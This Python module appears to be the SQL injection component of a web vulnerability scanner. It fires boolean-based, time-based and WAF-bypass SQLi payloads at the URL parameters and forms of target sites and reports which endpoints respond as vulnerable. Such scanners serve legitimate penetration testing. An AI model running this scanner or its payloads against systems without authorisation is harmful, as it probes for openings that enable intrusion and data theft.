import requests
import random
import re
import time as _time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urljoin, quote
from bs4 import BeautifulSoup
from colorama import init, ansi
from parametizer.progress import update_progress, print_vulnerability
from parametizer.core.headers import get_headers
import urllib3
import threading
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from vulnerability_manager import vuln_manager
try:
    from scanners.sqli_patterns import is_sqli_error_response
except ImportError:
    from sqli_patterns import is_sqli_error_response

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_STATIC_EXTENSIONS = (
    ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg",
    ".woff", ".woff2", ".ico", ".ttf", ".eot", ".mp4", ".webm", ".pdf",
)

# Parámetros de tracking/analytics que nunca llegan a una query SQL
_TRACKING_PARAMS: frozenset = frozenset({
    "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
    "utm_id", "utm_reader", "utm_name", "utm_placing",
    "fbclid", "gclid", "msclkid", "dclid", "twclid",
    "_ga", "_gid", "_gl", "_hsenc", "_hsmi",
    "mc_eid", "mc_cid",
    "ref", "referrer",
})

# Params de paginación con prefijo hash generado por Symfony/WP/otros (ej: a1d72e41_page)
_HASHED_PAGE_RE = re.compile(r'^[0-9a-f]{6,}_page$', re.IGNORECASE)


def _is_static_path(url: str) -> bool:
    """Retorna True si la URL apunta a un recurso estático (no testeable para SQLi)."""
    path = urlparse(url).path.lower()
    return path.endswith(_STATIC_EXTENSIONS)


def _is_non_injectable_param(param: str) -> bool:
    """
    Retorna True si el parámetro es de tracking/analytics o paginación hash
    y no tiene sentido testear SQLi en él.
    """
    p = param.lower()
    if p in _TRACKING_PARAMS:
        return True
    if _HASHED_PAGE_RE.match(p):
        return True
    return False

# ---------------------------------------------------------------------------
# ANÁLISIS MULTI-CAPA PARA SQLi
# ---------------------------------------------------------------------------

# Pares (condición_true, condición_false) para boolean-based detection
_SQLI_BOOLEAN_PAIRS: list = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("' OR 1=1--", "' OR 1=2--"),
]

# Payloads time-based por motor de base de datos
_SQLI_TIME_PAYLOADS: list = [
    ("' OR SLEEP(3)--",               "mysql"),
    ("1; WAITFOR DELAY '0:0:3'--",    "mssql"),
    ("' OR pg_sleep(3)--",            "postgresql"),
    ("1 AND SLEEP(3)",                "mysql"),
    ("' OR 3=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", "oracle"),
]

# Payloads WAF bypass (comment injection, case, encoding, tab)
_SQLI_WAF_BYPASS_PAYLOADS: list = [
    "'/**/OR/**/1=1--",
    "' Or 1=1--",
    "' /*!OR*/ 1=1--",
    "'\t OR\t 1=1--",
    "' OR 0x31=0x31--",
    "'||'1'='1",
    "%27%20OR%201%3D1--",
    "\\' OR 1=1--",
]

# Umbral de tiempo para considerar time-based exitoso
_SQLI_TIME_THRESHOLD: float = 2.5

# Params que habitualmente consultan BD (heurística para activar time-based)
_SQL_LIKELY_PARAMS: frozenset = frozenset({
    "id", "uid", "user_id", "userid", "product_id", "item_id", "cat_id",
    "category", "search", "query", "q", "s", "filter", "sort", "order",
    "page", "p", "start", "offset", "limit", "num",
    "login", "username", "user", "email",
    "name", "title", "slug", "key",
})


def _sqli_test_boolean(base_url: str, param: str, method: str,
                        headers: dict, baseline_text: str) -> tuple:
    """
    Prueba boolean-based SQLi comparando respuestas de condición TRUE vs FALSE.
    Retorna (True, payload_true) si hay diferencia significativa (≥20% de longitud).
    Solo se activa cuando la respuesta ya cambió respecto al baseline pero
    no hubo error SQL detectado.
    """
    len_baseline = len(baseline_text)
    if len_baseline == 0:
        return False, ""

    for true_p, false_p in _SQLI_BOOLEAN_PAIRS[:3]:
        try:
            if method == "get":
                r_true  = requests.get(base_url, params={param: true_p},  headers=headers, verify=False, timeout=5)
                r_false = requests.get(base_url, params={param: false_p}, headers=headers, verify=False, timeout=5)
            else:
                r_true  = requests.post(base_url, data={param: true_p},  headers=headers, verify=False, timeout=5)
                r_false = requests.post(base_url, data={param: false_p}, headers=headers, verify=False, timeout=5)

            if r_true.status_code != 200 or r_false.status_code != 200:
                continue

            diff_true  = abs(len(r_true.text)  - len_baseline) / len_baseline
            diff_false = abs(len(r_false.text) - len_baseline) / len_baseline

            # TRUE debe parecerse al baseline; FALSE debe divergir ≥20%
            if diff_true < 0.15 and diff_false >= 0.20:
                return True, true_p
        except Exception:
            continue
    return False, ""


def _sqli_test_time_based(base_url: str, param: str, method: str,
                           headers: dict) -> tuple:
    """
    Prueba time-based SQLi con doble confirmación para evitar falsos positivos por
    latencia de red o servidor lento:
      1. Mide el tiempo base con un valor benigno.
      2. Envía el payload SLEEP y verifica que tarde >= (baseline + sleep_secs * 0.75).
      3. Repite el payload una segunda vez para confirmar consistencia.
    Retorna (True, payload, db_type) solo si ambas confirmaciones pasan.
    """
    # Medir baseline con valor benigno
    try:
        t0 = _time.time()
        if method == "get":
            requests.get(base_url, params={param: "1"}, headers=headers, verify=False, timeout=7)
        else:
            requests.post(base_url, data={param: "1"}, headers=headers, verify=False, timeout=7)
        baseline_time = _time.time() - t0
    except Exception:
        baseline_time = 0.5  # asumir 500ms si falla

    sleep_secs = 3
    required_delta = sleep_secs * 0.75  # el servidor debe tardar al menos 2.25s más que el baseline

    for tp, db in _SQLI_TIME_PAYLOADS[:2]:
        try:
            # Primera medición con sleep
            s1 = _time.time()
            if method == "get":
                requests.get(base_url, params={param: tp}, headers=headers, verify=False, timeout=10)
            else:
                requests.post(base_url, data={param: tp}, headers=headers, verify=False, timeout=10)
            elapsed1 = _time.time() - s1

            if elapsed1 - baseline_time < required_delta:
                continue  # no hay delta suficiente, no es time-based real

            # Segunda confirmación: re-enviar el payload para descartar fluctuación
            s2 = _time.time()
            if method == "get":
                requests.get(base_url, params={param: tp}, headers=headers, verify=False, timeout=10)
            else:
                requests.post(base_url, data={param: tp}, headers=headers, verify=False, timeout=10)
            elapsed2 = _time.time() - s2

            if elapsed2 - baseline_time >= required_delta:
                return True, tp, db

        except requests.exceptions.Timeout:
            # Timeout en ambas mediciones confirma SLEEP real
            try:
                s2 = _time.time()
                if method == "get":
                    requests.get(base_url, params={param: tp}, headers=headers, verify=False, timeout=10)
                else:
                    requests.post(base_url, data={param: tp}, headers=headers, verify=False, timeout=10)
            except requests.exceptions.Timeout:
                return True, tp, db
            except Exception:
                pass
        except Exception:
            continue
    return False, "", ""


def _sqli_test_waf_bypass(base_url: str, param: str, method: str,
                           headers: dict) -> tuple:
    """
    Prueba payloads de WAF bypass cuando el scanner inicial recibió 403/406.
    Retorna (True, payload) si alguno evadió el bloqueo y generó error SQL.
    """
    for wp in _SQLI_WAF_BYPASS_PAYLOADS:
        try:
            if method == "get":
                r = requests.get(base_url, params={param: wp}, headers=headers, verify=False, timeout=5)
            else:
                r = requests.post(base_url, data={param: wp}, headers=headers, verify=False, timeout=5)
            if r.status_code in (200, 500) and is_sqli_error_response(r.text):
                return True, wp
        except Exception:
            continue
    return False, ""


def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, random_agent=False):
    sys.stdout.write('\033[1;36m<<<<<<<<<<<<\033[0m Testing SQL Injection \033[1;36m>>>>>>>>>>>>>>\033[0m\n')
    print()
    sys.stdout.flush()


    total_tasks = (len(urip) * 2 + len(urif)) * len(wordlist)
    current = 0
    lock = threading.Lock()
    vulnerable_endpoints = set()

    try:
        from scanners.ban_detector import get_ban_detector
    except ImportError:
        from ban_detector import get_ban_detector
    ban = get_ban_detector()

    # Cache para baselines y endpoints vulnerables
    baseline_cache = {}
    form_cache = {}
    stdout_lock = threading.Lock()

    def get_baseline_response(method, url, data=None):
        try:
            # Solo hacer request si hay datos, sino retornar string vacío
            if not data:
                return ""
                
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
            if method == "post":
                r = requests.post(url, data={k: "TEST123" for k in data}, headers=headers, verify=False, timeout=5)
            elif method == "get":
                r = requests.get(url, params={k: "TEST123" for k in data}, headers=headers, verify=False, timeout=5)
            else:
                return ""
            return r.text.lower()
        except requests.exceptions.Timeout:
            return ""  # Timeout específico
        except requests.exceptions.RequestException:
            return ""  # Otros errores de requests
        except Exception:
            return ""  # Cualquier otro error

    def test_url(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)
        headers=get_headers(random_agent=random_agent, custom_headers=custom_headers)

        if not qs or _is_static_path(url):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        # Verificar si ya se explotó esta URL usando el sistema unificado
        if vuln_manager.should_skip_url(base_url, base_url_only=True):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in qs:
            if _is_non_injectable_param(param):
                continue

            # Verificar si ya se explotó esta combinación específica
            if vuln_manager.should_skip_url(base_url, param):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return
                
            data = {param: payload}
            
            # Cache de baseline para GET
            baseline_key = f"GET-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                baseline_cache[baseline_key] = get_baseline_response("get", base_url, data)
            baseline = baseline_cache[baseline_key]
            
            _sqli_domain = parsed.netloc
            if ban.is_banned(_sqli_domain):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return

            try:
                r = requests.get(base_url, params=data, headers=headers, verify=False, timeout=5)
                ban.record(_sqli_domain, r.status_code, r, base_url)

                def _report_sqli_get(win_payload, technique="ERROR-BASED"):
                    if vuln_manager.is_already_exploited(base_url, param):
                        return False
                    # Para TIME-BASED la confirmación de FP es la doble medición
                    # del propio _sqli_test_time_based; verify_sqli_false_positive
                    # chequea errores SQL, lo que no aplica a timing.
                    is_time_based = "TIME-BASED" in technique
                    if not is_time_based:
                        if vuln_manager.verify_sqli_false_positive(
                            base_url, "GET", param=param,
                            custom_headers=custom_headers, random_agent=random_agent
                        ):
                            return False
                    with lock:
                        if base_url in vulnerable_endpoints:
                            return False
                        vulnerable_endpoints.add(base_url)
                    vuln_manager.mark_as_exploited(base_url, param)
                    vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                    with stdout_lock:
                        encoded = quote(win_payload, safe='')
                        print_vulnerability(f"\033[1;32m[GET][{technique}]\033[0m {base_url}?{param}={encoded}")
                    entry = f"{base_url}?{param}={quote(win_payload, safe='')}"
                    if technique != "ERROR-BASED":
                        entry += f"|||BYPASS_TECHNIQUE:{technique}|||BYPASS_ORIGINAL:{quote(payload, safe='')}"
                    urls_vulnerables.append(entry)
                    return True

                # ── CAPA 1: Error-based (existente) ───────────────────────
                if r.status_code in (200, 500) and is_sqli_error_response(r.text) and r.text.lower() != baseline:
                    if _report_sqli_get(payload):
                        current += 1
                        update_progress(current, total_tasks)
                        return

                # ── CAPA 2: WAF bypass (403/406 bloqueó el payload inicial) ─
                elif r.status_code in (403, 406, 429):
                    ok, wp = _sqli_test_waf_bypass(base_url, param, "get", headers)
                    if ok and _report_sqli_get(wp, "WAF-BYPASS"):
                        current += 1
                        update_progress(current, total_tasks)
                        return

                # ── CAPA 3: Boolean-based (respuesta cambió pero sin error) ─
                elif (r.status_code == 200
                      and r.text.lower() != baseline
                      and base_url not in vulnerable_endpoints):
                    ok, bp = _sqli_test_boolean(base_url, param, "get", headers, baseline)
                    if ok and _report_sqli_get(bp, "BOOLEAN-BASED"):
                        current += 1
                        update_progress(current, total_tasks)
                        return

                    # ── CAPA 4: Time-based (param sospechoso sin diferencia clara) ─
                    if param.lower() in _SQL_LIKELY_PARAMS and base_url not in vulnerable_endpoints:
                        ok, tp, db = _sqli_test_time_based(base_url, param, "get", headers)
                        if ok and _report_sqli_get(tp, f"TIME-BASED[{db}]"):
                            current += 1
                            update_progress(current, total_tasks)
                            return

            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_post(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)

        # Verificar si ya se explotó esta URL usando el sistema unificado
        if vuln_manager.should_skip_url(base_url, base_url_only=True) or not qs or _is_static_path(url):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in qs:
            if _is_non_injectable_param(param):
                continue

            # Verificar si ya se explotó esta combinación específica
            if vuln_manager.should_skip_url(base_url, param):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return
                
            data = {param: payload}
            
            # Cache de baseline para POST
            baseline_key = f"POST-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                baseline_cache[baseline_key] = get_baseline_response("post", base_url, data)
            baseline = baseline_cache[baseline_key]

            if ban.is_banned(parsed.netloc):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return

            try:
                ph = get_headers(random_agent=random_agent, custom_headers=custom_headers)
                r = requests.post(base_url, data=data, headers=ph, verify=False, timeout=5)
                ban.record(parsed.netloc, r.status_code, r, base_url)

                def _report_sqli_post(win_payload, technique="ERROR-BASED"):
                    if vuln_manager.is_already_exploited(base_url, param):
                        return False
                    is_time_based = "TIME-BASED" in technique
                    if not is_time_based:
                        if vuln_manager.verify_sqli_false_positive(
                            base_url, "POST", param=param,
                            custom_headers=custom_headers, random_agent=random_agent
                        ):
                            return False
                    with lock:
                        if base_url in vulnerable_endpoints:
                            return False
                        vulnerable_endpoints.add(base_url)
                    vuln_manager.mark_as_exploited(base_url, param)
                    vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                    with stdout_lock:
                        encoded = quote(win_payload, safe='')
                        print_vulnerability(f"\033[1;32m[POST][{technique}]\033[0m {base_url}?{param}={encoded}")
                    entry = f"{base_url}?{param}={quote(win_payload, safe='')}"
                    if technique != "ERROR-BASED":
                        entry += f"|||BYPASS_TECHNIQUE:{technique}|||BYPASS_ORIGINAL:{quote(payload, safe='')}"
                    urls_vulnerables.append(entry)
                    return True

                # ── CAPA 1: Error-based ────────────────────────────────────
                if r.status_code in (200, 500) and is_sqli_error_response(r.text) and r.text.lower() != baseline:
                    if _report_sqli_post(payload):
                        current += 1
                        update_progress(current, total_tasks)
                        return

                # ── CAPA 2: WAF bypass ────────────────────────────────────
                elif r.status_code in (403, 406, 429):
                    ok, wp = _sqli_test_waf_bypass(base_url, param, "post", headers)
                    if ok and _report_sqli_post(wp, "WAF-BYPASS"):
                        current += 1
                        update_progress(current, total_tasks)
                        return

                # ── CAPA 3: Boolean-based ─────────────────────────────────
                elif (r.status_code == 200
                      and r.text.lower() != baseline
                      and base_url not in vulnerable_endpoints):
                    ok, bp = _sqli_test_boolean(base_url, param, "post", headers, baseline)
                    if ok and _report_sqli_post(bp, "BOOLEAN-BASED"):
                        current += 1
                        update_progress(current, total_tasks)
                        return

                    # ── CAPA 4: Time-based ────────────────────────────────
                    if param.lower() in _SQL_LIKELY_PARAMS and base_url not in vulnerable_endpoints:
                        ok, tp, db = _sqli_test_time_based(base_url, param, "post", headers)
                        if ok and _report_sqli_post(tp, f"TIME-BASED[{db}]"):
                            current += 1
                            update_progress(current, total_tasks)
                            return

            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_form(url, payload):
        nonlocal current
        try:
            # Cache de formularios para evitar re-parsing
            if url not in form_cache:
                r = requests.get(url, headers=get_headers(random_agent=random_agent, custom_headers=custom_headers), timeout=7)
                soup = BeautifulSoup(r.text, "html.parser")
                forms = soup.find_all("form")
                form_cache[url] = forms
            else:
                forms = form_cache[url]
                
            for form in forms:
                action = form.get("action")
                method = form.get("method", "get").lower()
                inputs = form.find_all("input")
                data = {}
                headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)

                for i in inputs:
                    name = i.get("name")
                    if name:
                        data[name] = payload

                if not data:
                    continue

                full_url = urljoin(url, action) if action else url

                if vuln_manager.should_skip_url(full_url, base_url_only=True):
                    continue
                
                form_param = sorted(data.keys())[0]
                if vuln_manager.should_skip_url(full_url, form_param):
                    continue
                
                # Cache de baseline para formularios
                baseline_key = f"{method}-{full_url}-{','.join(sorted(data.keys()))}"
                if baseline_key not in baseline_cache:
                    baseline_cache[baseline_key] = get_baseline_response(method, full_url, data)
                baseline = baseline_cache[baseline_key]

                if method == "post":
                    res = requests.post(full_url, data=data, headers=headers, verify=False, timeout=5)
                else:
                    res = requests.get(full_url, params=data, headers=headers, verify=False, timeout=5)

                def _report_sqli_form(win_payload, win_data, technique="ERROR-BASED"):
                    if vuln_manager.is_already_exploited(full_url, form_param):
                        return False
                    if vuln_manager.verify_sqli_false_positive(
                        full_url, method.upper(), form_data=win_data,
                        custom_headers=custom_headers, random_agent=random_agent
                    ):
                        return False
                    with lock:
                        if full_url not in vulnerable_endpoints:
                            vulnerable_endpoints.add(full_url)
                            vuln_manager.mark_as_exploited(full_url, form_param)
                            vuln_manager.mark_as_exploited(full_url, base_url_only=True)
                            with stdout_lock:
                                encoded_data = {k: quote(v, safe='') for k, v in win_data.items()}
                                print_vulnerability(f"\033[1;32m[FORM][{technique}]\033[0m {full_url}\n{encoded_data}")
                            entry = f"{full_url}"
                            if technique != "ERROR-BASED":
                                entry += f"|||BYPASS_TECHNIQUE:{technique}|||BYPASS_ORIGINAL:{quote(payload, safe='')}"
                            urls_vulnerables.append(entry)
                            return True
                    return False

                # ── CAPA 1: Error-based ────────────────────────────────────
                if res.status_code in (200, 500) and is_sqli_error_response(res.text) and res.text.lower() != baseline:
                    if _report_sqli_form(payload, data):
                        current += 1
                        update_progress(current, total_tasks)
                        return

                # ── CAPA 2: WAF bypass ────────────────────────────────────
                elif res.status_code in (403, 406, 429):
                    ok, wp = _sqli_test_waf_bypass(full_url, form_param, method, headers)
                    if ok:
                        bypass_data = {k: wp for k in data}
                        if _report_sqli_form(wp, bypass_data, "WAF-BYPASS"):
                            current += 1
                            update_progress(current, total_tasks)
                            return

                # ── CAPA 3: Boolean-based ─────────────────────────────────
                elif (res.status_code == 200
                      and res.text.lower() != baseline
                      and full_url not in vulnerable_endpoints):
                    ok, bp = _sqli_test_boolean(full_url, form_param, method, headers, baseline)
                    if ok:
                        bool_data = {k: bp for k in data}
                        if _report_sqli_form(bp, bool_data, "BOOLEAN-BASED"):
                            current += 1
                            update_progress(current, total_tasks)
                            return
        except requests.exceptions.Timeout:
            pass  # Skip timeouts silently
        except requests.exceptions.RequestException:
            pass  # Skip other request errors
        except Exception:
            pass  # Skip any other errors
            
        with lock:
            current += 1
            update_progress(current, total_tasks)

    # No materializar millones de tareas/futures: agota RAM y el kernel mata el proceso (zsh: killed).
    pending_max = max(threads * 200, 2000)

    def drain_batch(batch):
        for fut in as_completed(batch):
            try:
                fut.result()
            except Exception:
                pass

    with ThreadPoolExecutor(max_workers=threads) as executor:
        pending = []
        for url in urip:
            for payload in wordlist:
                pending.append(executor.submit(test_url, url, payload))
                pending.append(executor.submit(test_post, url, payload))
                if len(pending) >= pending_max:
                    drain_batch(pending)
                    pending.clear()
        for url in urif:
            for payload in wordlist:
                pending.append(executor.submit(test_form, url, payload))
                if len(pending) >= pending_max:
                    drain_batch(pending)
                    pending.clear()
        if pending:
            drain_batch(pending)
    
    # Limpiar salida final
    with stdout_lock:
        sys.stdout.write('\r' + ansi.clear_line())
        sys.stdout.flush()
    print()
    if vulnerable_endpoints:
        sys.stdout.write(f'\033[1;36m[+] Found {len(vulnerable_endpoints)} potential SQLi vulnerabilities\033[0m\n')
        sys.stdout.flush()
    else:
        sys.stdout.write('\033[1;31m[-] No SQLi vulnerabilities found\033[0m\n')
        sys.stdout.flush()
    print()
    
    return urls_vulnerables
